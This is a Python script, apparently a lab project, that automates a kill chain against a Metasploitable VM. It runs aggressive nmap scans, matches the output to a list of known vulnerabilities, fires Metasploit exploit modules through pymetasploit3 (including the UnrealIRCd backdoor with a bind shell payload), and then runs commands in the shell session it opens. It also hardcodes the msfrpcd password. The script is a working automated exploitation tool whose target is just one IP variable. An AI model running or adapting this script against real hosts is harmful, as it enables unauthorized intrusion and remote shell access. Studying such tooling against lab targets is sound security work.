# for now this nmaps metasploitable, checks if port 6667 is open which runs UnrealIRCd
# which has a vulnerability, and then it exploits that

# ***************************************
# ******* TO GET THIS SHIT TO RUN *******
# 0) sudo apt install snap
# 1) export PATH=$PATH:/snap/bin
# 2) msfrpcd -P Trevor34

from pymetasploit3.msfrpc import *
import utils
import sys
import nmap_dest
import re
from knownVulnerabilities import vulnerabilities

if __name__ == "__main__":
    # initial setup, dont worry what this does
    # UNCOMMENT THIS IF SHIT ISNT WORKING
    # try:
    #     utils.runThisCommand("msfrpcd -P PASSWORD")
    # except:
    #     sys.path.append('/snap/bin')
    #     utils.runThisCommand("msfrpcd -P PASSWORD")
    
    client = MsfRpcClient('Trevor34', port=55553, ssl=True)
    
    ######## RECONAISSANCE PHASE ########
    RHOSTS = "192.168.119.129"
    nmapAggressiveness = 2
    # in order of increasing levels of fucking around (and also in increasing levels of finding out)
    nmapPossibleArgs = ["", "-A -T4", "-p- -sV -O", "-p- -sV -O -A -T5 -sC -Pn"]
    nmapArgs = nmapPossibleArgs[nmapAggressiveness]
    output = nmap_dest.nmap_xml_output(RHOSTS, nmapArgs)
    print(output)
    if (output[1][0:22] == "Note: Host seems down."):
        print("Host seems down. Exiting.")
        exit()

    ######## WEAPONIZATION PHASE ########
    vulnerabilitiesToUse = set()
    for line in output:
        # Detect what keywords each line of the nmap output contains and compare those to the descriptions
        # for each known vulnerability and if all key words of a vulnerability are found, add it to the exploit list
        for vulnerability in vulnerabilities:
            keyWordsFoundCount = 0
            flag = None
            if vulnerability.caseSensitiveKeyTermMatch:
                flag = 0
            else:
                flag = re.IGNORECASE
            for keyword in vulnerability.keywords:
                if re.search(keyword, line, flag):
                    keyWordsFoundCount += 1
            if keyWordsFoundCount < vulnerability.minKeyTermsThatMustMatch:
                continue
            vulnerabilitiesToUse.add(vulnerability)
            print(line)
            print("*********", vulnerability.description, "EXPLOIT FOUND *********")

    ######## DELIVERY, EXPLOITATION, INSTALLATION PHASE ########
    # exploit = client.modules.use('exploit', 'unix/irc/unreal_ircd_3281_backdoor')
    # exploit['RHOSTS'] = RHOSTS
    # payload = client.modules.use('payload', 'cmd/unix/bind_ruby')
    # exploit.execute(payload='cmd/unix/bind_ruby')
    for vulnerability in vulnerabilitiesToUse:
        module = vulnerability.module
        exploit = client.modules.use('exploit', module)
        # options = exploit.options
        missingOptions = exploit.missing_required
        if 'RHOSTS' in missingOptions:
            exploit['RHOSTS'] = RHOSTS
        exploit.execute(payload=vulnerability.payload)
    
    # TODO: FIGURE OUT HOW TO KILL A FUCKING SESSION
    sessions = client.sessions.list
    print(sessions)
    if len(sessions) > 0:
        shell = client.sessions.session('1')
        shell.write('whoami')
        shell.write('pwd')
        print(shell.read())

    print()
    